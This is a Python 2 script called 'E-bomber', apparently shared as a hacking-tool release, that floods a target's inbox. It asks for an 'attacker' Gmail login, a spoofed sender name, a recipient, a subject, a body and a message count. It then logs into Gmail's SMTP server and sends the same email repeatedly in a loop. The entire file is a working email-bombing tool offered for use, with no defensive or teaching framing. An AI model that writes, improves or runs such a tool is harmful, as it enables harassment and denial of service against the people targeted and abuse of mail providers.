#!/usr/bin/python
#E-bomber



import os
import smtplib
import getpass
import sys
import time

print '                                                                    '
print '                                                                    '
print '            #################################################       '
print '            #               **************                  #       '
print '            #               * Email Bomb *                  #       '
print '            #               **************                  #       '
print '            #               create By HA-MRX                #       '
print '            #                                               #       '
print '            #             ( edited by DopeWiz )             #       '
print '            #                                               #       '
print '            #        https://www.youtube.com/c/HA-MRX       #       '
print '            #                                               #       '
print '            #        https://kurdkali.wordpress.com/        #       '
print '            #                                               #       '
print '            #    https://www.facebook.com/muhamad.jabar333  #       '
print '            #################################################       '

print '                                                                    '


print '                                           '

print '    '
while True:
    email = raw_input('Attacker Gmail Address : ')
    print '             '
    passwd = getpass.getpass('Password: ')
    
    print '      '
    user = raw_input('Anonymous name :  ')

    print '   '

    to = raw_input('\nTo:   ')
    print '    '
    subject = raw_input("Subject:   ")
    print '    '

    print('BODY:')
    print('---Type "EOF" and press enter to complete the body---')
    print '     '
    lines = []
    while True:
        line = raw_input()
        if (line == 'EOF'):
            break
        else:
            lines.append(line)
    body = '\n'.join(lines)
    print '    '
    
    total = input('Number of send:  ')

    smtp_server = 'smtp.gmail.com'
    port = 587
    print ' '
    try:
        server = smtplib.SMTP(smtp_server,port) 
        server.ehlo()
        server.starttls()
        server.login(email,passwd)
        for i in range(1, total+1):
            msg = 'From: ' + user + '\nSubject: ' + subject + '\n' + body
            server.sendmail(email,to,msg)
            print "\rE-mails sent: %i" % i
            time.sleep(1)
            sys.stdout.flush()
        server.quit()
        print '\n Done !!!' 
        print ' '

        choice = raw_input("Want to send another time(Y/N): ")
        if (choice == 'y') or (choice == 'Y'):
            continue
        elif (choice == 'N') or (choice == 'n'):
            print ' '
            print("Thanks for using!!!")
            break
        else:
            print("Invalid choice!!!")
            continue
    except KeyboardInterrupt:
        print '[-] Canceled'
        sys.exit()
    except smtplib.SMTPAuthenticationError:
        print '\n[!] The email or password you entered is incorrect.'
sys.exit()
